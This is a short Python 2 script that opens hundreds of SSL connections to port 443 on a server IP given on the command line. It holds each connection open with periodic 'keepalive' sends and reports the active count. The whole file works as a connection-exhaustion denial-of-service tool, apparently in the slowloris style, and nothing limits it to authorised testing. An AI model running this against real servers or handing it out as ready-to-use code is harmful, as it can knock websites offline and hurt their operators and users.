#!/usr/bin/python

import sys
import time
import socket
import threading
from multiprocessing import Process, RawValue, Lock
import ssl

#Thread safe counter to count number of active threads
class Counter(object):
    def __init__(self, value=0):
        self.val = RawValue('i', value)
        self.lock = Lock()

    def add(self):
        with self.lock:
            self.val.value += 1

    def remove(self):
        with self.lock:
            self.val.value -= 1

    def value(self):
        with self.lock:
            return self.val.value

try:
    ip = sys.argv[1]
    try:
        threads = int(sys.argv[2])
    except Exception as e:
        threads = 300
except:
    print "Please specify server ip"

#initializing variables
sendPackets = True

counter = Counter(0)

#connection that runs in every thread
def connection():
    s = ssl.wrap_socket(socket.socket(socket.AF_INET,
         socket.SOCK_STREAM)) #SSL encrypted socket
    s.settimeout(5)

    try:
        s.connect((ip,443))
        counter.add()
        while sendPackets:
            try:
                time.sleep(1)
                s.send("keepalive") #sending a message periodically to keep connection alive
            except Exception as e:
                break #if connection closes, break the message sending loop
        counter.remove()
    except Exception as ex:
        return #if connection fails, just end thread without adding to counter

#creating threads based on input or default value
for i in range(0, threads):
    thread = threading.Thread(target = connection)
    thread.daemon =True
    thread.start()
try:
    while True:
        print "{} connections active".format(counter.value())
        time.sleep(3)
except KeyboardInterrupt:
    sendPackets = False
